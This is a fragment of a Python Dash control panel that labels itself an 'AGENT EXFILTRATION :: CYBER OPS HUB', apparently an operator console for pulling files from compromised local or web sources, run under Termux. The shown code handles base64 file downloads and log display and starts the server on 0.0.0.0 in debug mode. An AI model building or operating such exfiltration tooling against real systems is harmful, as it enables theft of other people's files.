            file_content_base64 = ""
            filename = os.path.basename(file_item['path'])

            try:
                if source_type == 'local' and not isinstance(global_file_explorer, BaseMockExplorer):
                    file_content_base64 = global_file_explorer.download_file_base64(file_full_path)
                elif source_type == 'web' and not isinstance(global_web_explorer, BaseMockExplorer):
                    file_content_base64 = global_web_explorer.download_file_base64_from_url(file_full_path)
                else:
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] ERROR: Explorer for '{source_type}' not available or in mock mode for download.")
                    raise dash.exceptions.PreventUpdate

                if file_content_base64 and not file_content_base64.startswith("[ERROR]"):
                    decoded_content = base64.b64decode(file_content_base64.encode('utf-8'))
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] Downloading '{file_item['path']}'.")
                    return dcc.send_bytes(decoded_content, filename)
                else:
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] ERROR: Failed to get file content (Base64) for '{file_full_path}': {file_content_base64}")
                    raise dash.exceptions.PreventUpdate
            except Exception as e:
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] Error during file download for '{file_full_path}': {e}")
                raise dash.exceptions.PreventUpdate
    raise dash.exceptions.PreventUpdate


@app.callback(
    Output('explorer-logs-output', 'children'),
    Output('explorer-log-last-index', 'data'),
    Input('interval-explorer-logs', 'n_intervals'), # Now this input only exists when the tab is rendered
    State('explorer-log-last-index', 'data'),
    State('cyber-tabs', 'value'), # Add a state to check the active tab
    prevent_initial_call=False
)
def refresh_explorer_logs(n_intervals, current_log_indices, active_tab):
    # Only update if the 'File Explorer' tab is active
    if active_tab != 'tab-file-explorer':
        raise dash.exceptions.PreventUpdate

    # Récupérer les nouveaux logs du LogStreamer
    new_logs, new_total_index = global_log_streamer.get_logs(current_log_indices['file'])

    if new_logs:
        # Ajoute les nouveaux logs au buffer d'état global de l'explorateur (pour persister l'affichage)
        explorer_log_states['file_explorer']['logs'].extend(new_logs)

        # Met à jour l'index du dernier log lu
        current_log_indices['file'] = new_total_index
        
        # Retourne tous les logs stockés (anciens + nouveaux)
        return html.Pre("\n".join(explorer_log_states['file_explorer']['logs']), style=CYBER_STATUS_BOX_STYLE), current_log_indices

    # Si aucun nouveau log, retourne l'état actuel sans changement
    return html.Pre("\n".join(explorer_log_states['file_explorer']['logs']), style=CYBER_STATUS_BOX_STYLE), current_log_indices


if __name__ == '__main__':
    print("\n[--- AGENT EXFILTRATION :: CYBER OPS HUB V1.0 ---]")
    print("[+] Ensure Python, pip, and Dash are installed in Termux.")
    print(f"[+] This script is located at: {AGENT_DIR}")
    print("[+] To launch the control panel, navigate to the agent directory and execute:")
    print(f"   cd {AGENT_DIR} && nohup python -u control_panel.py > control_panel.log 2>&1 &")
    print("\n[+] Access the interface in your Android browser at : http://127.0.0.1:8050")
    print("[+] Keep this Termux terminal open while the interface is active.")

    try:
        app.run(host='0.0.0.0', debug=True, port=8050)
    except Exception as e:
        print(f"ERROR LAUNCHING DASH SERVER: {e}")
        print("Verify if the port is already in use or if Dash is properly installed.")


